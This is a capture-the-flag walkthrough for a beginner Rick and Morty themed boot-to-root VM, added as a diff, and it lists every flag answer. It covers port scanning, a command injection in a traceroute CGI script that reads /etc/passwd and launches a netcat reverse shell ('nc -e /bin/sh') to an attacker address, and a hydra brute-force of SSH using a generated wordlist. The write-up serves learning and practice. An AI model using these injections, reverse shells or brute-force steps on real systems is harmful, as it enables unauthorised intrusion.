@@ -1,0 +1,128 @@
+#introduction
+
+This is a fedora server vm, created with virtualbox.
+It is a very simple Rick and Morty themed boot to root.
+There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.
+It's designed to be a beginner ctf, if you're new to pen testing (and a fan of Rick And Morty), check it out!
+
+#footprinting
+*** Address
+The IP address can be found by many methods, hand made scripts or simply netdiscover:
+  netdiscover -r 192.168.1.1/24
+  192.168.1.12
+
+*** preliminary finding
+**9090
+First flag is on the port 9090. There's an admin console... 
+---FLAG {There is no Zeus, in your face!} - 10 points.
+The form does not work, I tried bypassing the form with burp but POST and PUT methods are not allowed.
+
+**80
+The website has nothing on it.. What did I expect from a Morty :-| .. But there are some robots and "it's OK to shoot them!" :
+/robots.txt
+They're Robots Morty! It's ok to shoot them! They're just Robots!
+/cgi-bin/root_shell.cgi --> under-construction and there is nothing on it
+/cgi-bin/tracertool.cgi --> execute a traceroute with the parameter IP (possible command injection)
+/cgi-bin/* --> forbidden
+
+** Nikto
+A quick nikto scan gave us some cool results (check nikto-scan.out). There's an accessible directory named passwords 
+wich has a flag: 
+---FLAG{Yeah d- just don't do it.} - 10 Points
+Aaaaand a password in the page source of  password.html -> "winter"... Real clever Morty.
+
+** Dirb
+A dirb directory list brute forcing is needed to be sure we didnt miss anything else... Aaand there is nothing else.
+
+#scanning
+*** Nmap
+A quick TCP port scan on the top ports:
+nmap -Pn -sS -n --reason -A --top-ports 10000 -oA rickdiculous 192.168.1.12
+21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh?    syn-ack ttl 64
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 ((Fedora))
+9090/tcp  open  http    syn-ack ttl 64 Cockpit web service
+13337/tcp open unknown  syn-ack ttl 64
+22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
+60000/tcp open  unknown syn-ack ttl 64
+
+#system hacking
+*** FTP
+Let's start with the easy stuff. We have an FTP server that allows anonymous ftp login. Let's check what's behind it:
+We got a flag:
+---FLAG{Whoa this is unexpected} - 10 Points
+and a pub directory with nothing in it.
+
+*** port 22 *
+On port 22 the connection seems to be closed. I used this command to see more details: ssh -vvv root@192.168.1.12
+Apparently we need a key to establish connection.
+
+*** port 60000 *
+Using nc, we get a "half baked reverse shell" and get a flag:
+---FLAG{Flip the pickle Morty!} - 10 Points
+Is this a hint? If so, I'm guessing the service behind this port uses python pickle ? We'll check this out later...
+
+*** port 80 (again) *
+Let's get back to the traceroute command located on /cgi-bin/tracertool.cgi
+
+So we can inject some code using | on the parameter ip:
+My first try was ?ip=127.0.0.1 | cat /etc/passwd and I got this nice cat:
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+
+The command is than aliased to another command. The command grep '[a-zA-Z0-9]' /etc/passwd
+still can be used
+I injected this command nc -e /bin/sh 192.168.1.13 4444 so I can get a shell with netcat.
+But nothing seems usefull.
+
+*** port 13337
+nc 192.168.1.12 13337 gave us an easy flag with no hints
+---FLAG:{TheyFoundMyBackDoorMorty}-10Points
+
+*** port 22222
+The port 22222 is running an openssh service. We had the password winter earlier, i trieded 
+with different user and it worked on Summer.
+Morty's home is accessible and got to files : 
+   - journal.txt.zip: password protected zip.
+   - Safe_Password.jpg: a picture of rick. I used steghide to find some hiden data but couldnt find any.
+	Using strings we got lucky : Safe password is Meeseek
+We got a flag from Morty's journal (and maybe a password):
+---FLAG: {131333} - 20 Points
+
+Morty's journal is talking about a safe. In Rick's home directory was a safe folder and an executable.
+Summer hasnt executable rights so I copied it in tmp to try and execute it and it worked.
+The executable need arguments. We used the flag 131333 and we got a flag and sme hints:
+---FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+The hints to guess Rick's password is :
+1 uppercase character
+1 digit
+One of the words in my old bands name.�	@
+
+Rick told me to make a script so I made a script:
+"
+import string
+for i in string.ascii_uppercase:
+        for x in range(10):
+                        print(i+str(x)+"Flesh")
+                        print(i+str(x)+"Curtains")
+"
+I generated a wordlist file using python script.py | tee rickpasswords.txt
+and I used hydra to (list-based) bruteforce the ssh port:
+hydra -s 22222 -l RickSanchez -P rickpasswords.txt 192.168.1.12 -t 4 ssh
+And the password for Rick's shell is: P7Curtains
+RickSanchez is a superuser so we can read the last flag in the root's directory:
+---FLAG: {Ionic Defibrillator} - 30 points
